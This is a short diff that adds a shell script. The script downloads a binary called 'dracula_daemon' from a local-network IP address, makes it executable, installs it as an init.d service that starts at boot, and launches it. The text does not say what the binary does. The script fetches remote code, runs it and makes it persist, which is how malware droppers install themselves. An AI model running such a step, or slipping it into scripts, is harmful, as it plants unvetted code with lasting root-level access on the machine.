@@ -1,0 +1,5 @@
+wget 192.168.200.254/dracula_daemon
+chmod +x dracula_daemon
+mv dracula_daemon /etc/init.d
+update-rc.d dracula_daemon defaults
+/etc/init.d/dracula_daemon start
